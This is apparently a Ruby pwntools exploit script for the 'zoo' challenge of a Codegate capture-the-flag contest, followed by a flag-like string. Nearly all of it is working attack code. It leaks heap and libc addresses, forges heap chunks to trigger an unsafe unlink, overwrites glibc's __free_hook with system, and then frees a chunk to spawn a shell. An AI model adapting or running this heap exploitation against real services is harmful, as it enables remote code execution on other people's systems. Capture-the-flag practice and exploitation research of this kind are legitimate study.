#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = 'ch41l3ng3s.codegate.kr', 7788
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'zoo'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64' 
# context.log_level = :debug

def pt(choice = nil)
  z.recvuntil('>> ')
  z.puts choice if choice
end

pt
z.puts 'meow'

def wname(name)
  pt
  name << "\n" if name.size < 20
  z.write name
end

def adopt(id, name)
  pt(1)
  pt(id)
  wname(name)
end

def feed(name)
  pt(2)
  wname(name)
end

def walk(name)
  pt(4)
  wname(name)
end

def hospital(name)
  pt(5)
  wname(name)
end

name1 = 'A' * 20
adopt(1, name1)
feed(name1)

z.recvuntil('Your animal ' + name1)
l = z.recvn(6)
heap_base = (l + "\x00\x00").u64 - 0x8c0
log.dump heap_base.hex
# can't use name1 anymore..

name2 = ('B' * 2).ljust(20, "\x00")
name3 = ('C' * 2).ljust(20, "\x00")
adopt(2, name2)
adopt(2, name3)

# skill - prescribed two animals
5.times { feed(name2); feed(name3) }
14.times {
  walk(name2)
  feed(name2)
}
14.times {
  walk(name3)
  feed(name3)
}
walk(name2)
walk(name3)

hospital(name2) # this should trigger prescribed
hospital(name3) # this should trigger prescribed

walk(name2) # free 950
feed(name2) # overflow 950 -> 9e0
pt; z.write "C" * 8
fake_chunk = heap_base + 0x970
# let unlink be no-op
pt; z.write(flat('D' * 8, 0, 0x61, fake_chunk, fake_chunk, [0] * 8, 0x60, 0x90))

walk(name3) # free 9e0 # trigger unlink
feed(name3) # set data so that 950's next size is correct
pt; z.write 0x31.p64
pt; z.write(0x31.p64 * 9)

walk(name2)
walk(name2)
walk(name2)
walk(name2)

2.times { feed(name2); pt; z.write 'A' * 8; pt; z.write('z'*8) } # not important, just consume smallbin
feed(name2) # 950
# now we can fake 980 as an unlinkable chunk
fake_chunk = heap_base + 0x980
ptr2fake = heap_base + 0x460
pt; z.write "C" * 8
pt; z.write(flat('D' * 16, 0x91, 0xdeadbeef, 0x171, ptr2fake - 0x18, ptr2fake - 0x10)) # prepare an unlinkable fake chunk

# use another animal to overflow again
name4 = 'DD'.ljust(20, "\x00")
adopt(3, name4)
5.times { feed(name4) }

9.times {
  walk(name4)
  feed(name4)
}
walk(name4)
walk(name4)

hospital(name4)
feed(name4) # 16d0, too far.
pt; z.write 'A' * 8; pt; z.write 'z'*8 # not important
feed(name4) # a10
# this overflow unsorted bin.. i don't want it but it's ok
pt; z.write 'c' * 8
pt; z.write('a' * 0x70 + 0x91.p64)

feed(name4) # aa0, allocated from unsorted bin
pt; z.write 'c' * 8
pt; z.write('a' * 56 + 0x170.p64 + 0x90.p64)

walk(name3) # well done!

z.write(flat(
  heap_base + 0x3b0, # for further control, points to name3's slot 0 - 24
  heap_base + 0xdd0, # leak libc
))

pt(6); wname(name3)
z.gets('Species : ')
libc = (z.read(6) + "\x00\x00").u64 - 0x3c4e38
# h.offset libc
log.dump libc.hex
feed(name3) # fills slot 0
pt;z.write 'a'; pt; z.write 'a'
walk(name3)
# overwrite slot 0, 1
free_hook = 0x3c67a8
pt; z.write (libc + free_hook - 0x18).p64 + (heap_base + 0x3b0 - 0x18).p64
walk(name3)
system = 0x45390
pt; z.write (libc + system).p64
pt; z.write "sh\x00"
pt; z.write "sh\x00" # dummy
walk(name3) # free(0x3b0) -> system("sh")

z.interact

# When y0u take M3dicine, you $hOuld underst4nd the Function 0f the M3dicine and E4T the right M3dicine
